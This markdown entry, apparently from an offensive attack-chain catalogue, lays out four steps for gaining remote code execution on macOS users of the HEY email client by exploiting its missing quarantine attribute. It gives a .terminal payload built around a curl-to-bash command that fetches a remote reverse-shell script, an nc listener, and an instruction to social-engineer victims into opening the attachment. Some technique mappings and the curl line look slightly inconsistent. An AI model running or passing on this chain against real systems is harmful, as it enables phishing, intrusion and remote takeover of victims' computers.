---
tags:
  - rce
  - gatekeeper-bypass
  - phishing
  - macos
  - electron
type: attack_chain
tools:
  - '[[tools/nc]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - macOS
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-Terminal-File]]'
  - '[[procedures/Send-Malicious-Email-Attachment-via-HEY]]'
  - '[[procedures/Set-Up-Reverse-Shell-Listener]]'
  - '[[procedures/Trigger-Exploit-Execution-on-Victim]]'
step_count: 4
techniques:
  - '[[Malicious File]]'
  - '[[Mark-of-the-Web Bypass]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:41.289Z'
description: >-
  Multi-stage attack exploiting the HEY macOS Electron app's failure to set
  quarantine attributes on downloaded attachments, enabling RCE through
  malicious .terminal files sent via email.
skill_level: intermediate
impact_level: high
id: 5301044f-427a-496b-b61f-b2495dd6e63b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Malicious File]]'
  - '[[Mark-of-the-Web Bypass]]'
  - '[[Unix Shell]]'
---
# Bypassing macOS Gatekeeper via HEY Email Client for Remote Code Execution

Multi-stage attack chain demonstrating exploitation of the HEY macOS client's improper file handling, allowing attackers to deliver and execute malicious payloads without Gatekeeper warnings.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Payload] --> B[Deliver via Email]
    B --> C[Set Up Listener]
    C --> D[Victim Execution and RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/nc]]

### Target Environment

- macOS with HEY Electron app installed
- Email access to send attachments via HEY inbox
- Network connectivity for reverse shell (port 80 open on attacker side)

### Initial Access Requirements

- Attacker email account compatible with HEY
- Victim using HEY macOS client
- No prior access needed beyond email delivery

## Detailed Attack Procedures

### Step 1: Create Malicious Payload
procedure: [[procedures/Create-Malicious-Terminal-File]]

**Objective**: Generate a .terminal file embedding a backdoor script that downloads and executes a reverse shell payload.

**Instructions**: Use a text editor to create an XML plist file with the malicious command. Save as 'exploit.terminal'.

The command embeds [[commands/curl-backdoor-download]]:

```bash
curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh
```

**Expected Output**: A .terminal file ready for attachment.

**Success Indicators**:
- File created with valid plist structure
- Command parses without errors when tested

### Step 2: Deliver Payload via Email
procedure: [[procedures/Send-Malicious-Email-Attachment-via-HEY]]

**Objective**: Upload the malicious attachment to the victim's HEY inbox, bypassing quarantine during download.

**Instructions**: Compose an email in the HEY app and attach the .terminal file. The Electron app fails to set com.apple.quarantine, allowing silent execution.

No specific command needed; use HEY's upload feature.

**Expected Output**: Email sent and attachment downloadable without warnings.

**Success Indicators**:
- Attachment received in victim's inbox
- File downloads without Gatekeeper prompt

### Step 3: Prepare for Callback
procedure: [[procedures/Set-Up-Reverse-Shell-Listener]]

**Objective**: Establish a listener to receive the reverse shell from the victim.

**Instructions**: On the attacker machine, run [[commands/nc-listener]] to listen on port 80:

```bash
nc -nvl 80
```

**Expected Output**: Listener active, waiting for connections.

**Success Indicators**:
- Port 80 bound successfully
- No firewall blocks on incoming connections

### Step 4: Trigger Execution and Gain Access
procedure: [[procedures/Trigger-Exploit-Execution-on-Victim]]

**Objective**: Victim opens the file, executing the payload and connecting back to the attacker.

**Instructions**: Social engineer the victim to open the .terminal attachment in Terminal. This runs the embedded [[commands/curl-backdoor-download]], downloading the script and establishing the shell via the listener.

**Expected Output**: Reverse shell session opens on attacker's nc listener.

**Success Indicators**:
- Incoming connection on port 80
- Interactive shell access to victim's machine

## Attack Chain Summary

### Key Achievements

1. Bypassed macOS Gatekeeper via missing quarantine attribute
2. Delivered RCE payload through email attachment
3. Achieved unauthenticated remote shell access

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Malicious File]] User Execution: Malicious File
- [[Mark-of-the-Web Bypass]] Subvert Trust Controls: Code Signing
- [[Unix Shell]] Command and Scripting Interpreter: Unix Shell

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---

*Last updated: 2023-10-01T00:00:00Z*
